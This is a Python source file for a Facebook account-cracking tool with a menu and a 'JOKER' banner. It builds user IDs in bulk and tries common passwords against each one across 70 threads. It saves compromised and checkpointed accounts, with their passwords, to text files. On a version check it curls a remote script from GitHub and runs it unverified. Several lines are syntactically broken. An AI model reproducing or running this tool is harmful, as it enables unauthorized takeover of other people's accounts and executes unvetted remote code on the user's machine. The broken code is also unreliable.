...
\33[1;37m----------------------------------------------
→   𝗢𝗪𝗡𝗘𝗥      :  𝗟𝗢𝗩𝗘 𝗦𝗛𝗔𝗛𝗜 𝗝𝗢𝗞𝗘𝗥
→   𝗙𝗮𝗰𝗲𝗕𝗼𝗼𝗸  :  𝗠𝗥 𝗝𝗢𝗞𝗘𝗥 𝗞𝗛𝗔𝗡
→   𝗚𝗜𝗧𝗛𝗨𝗕      : 𝗛𝗗 𝗞𝗢𝗞𝗢 𝗝𝗢𝗞𝗘𝗥
...
cps = []
try:
    print('\n Not worJOKER_123 your device\n\033[1;37m Please Wait\033[0;97m\n congratulations worJOKER_123 your device ')
    proxy = requests.get('https://raw.githubusercontent.com/JOKER_123-JUTT/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/JOKER_123-JUTT/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf JOKER_123')
        os.system('curl -L https://raw.githubusercontent.com/JOKER_123-JUTT/JOKER_123/main/JOKER_123.py > JOKER_123.py')
        os.system('python JOKER_123.py')
    else:pass
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open http://wa.me/+937266012?text=JOKER_123")
	if riaz1 =='3':
		os.system('xdg-open https://www.facebook.com/kanokwan.plengien'''''')riaz()
	if riaz1 =='2':
		bangla()
	else:
		print('\n\033[1;31mChoose vJOKER_123d option\033[0;97m')
		riaz()
...
def annu():
    ...
    if riaz1 =='4':
        ...
        print('\n\033[1;37m[+] SELECT VJOKER_123D optION\033[0;97m')        
def bangla():
	os.system('clear')
	print(logo)
...
def b1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,kode,'pakistan','khankhan','khan123','mJOKER_123k123','Ahmad123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def b2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'MJOKER_123K123','pakistan','khankhan','khan123','khan12345','123456','Ahmad123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[JOKER_123-OK] '+cid+'|'+ps+'\033[0;97m')
                open('JOKER_123-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[JOKER_123-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('JOKER_123-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mJOKER_123\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
